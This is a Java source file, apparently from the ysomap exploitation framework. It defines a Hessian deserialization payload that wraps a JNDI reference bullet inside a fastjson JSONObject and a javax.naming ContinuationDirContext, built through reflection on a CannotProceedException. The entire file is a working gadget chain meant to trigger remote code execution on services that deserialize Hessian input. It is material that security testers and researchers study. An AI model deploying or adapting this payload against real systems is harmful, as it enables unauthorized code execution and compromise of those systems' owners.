package ysomap.payloads.hessian;

import com.alibaba.fastjson.JSONObject;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.JNDIRefBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

import javax.naming.CannotProceedException;
import java.util.Hashtable;

@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.HESSIAN })
@Dependencies({"hessian"})
@Require(bullets = {
        "JNDIRefBullet","TomcatRefBullet"}, param = false)
public class JsonObjectWithoutToStringTriggerForHessian extends HessianPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return JNDIRefBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        JSONObject jsonObject = new JSONObject();
        CannotProceedException cpe = new CannotProceedException();
        ReflectionHelper.setFieldValue(cpe, "cause", null);
        ReflectionHelper.setFieldValue(cpe, "stackTrace", null);
        cpe.setResolvedObj(obj);
        ReflectionHelper.setFieldValue(cpe, "suppressedExceptions", null);
        Object ctx = ReflectionHelper.newInstance(
                "javax.naming.spi.ContinuationDirContext",
                new Class[]{CannotProceedException.class, Hashtable.class},
                cpe, new Hashtable<>());
        jsonObject.put("ysomap", ctx);

        return jsonObject;
    }
}
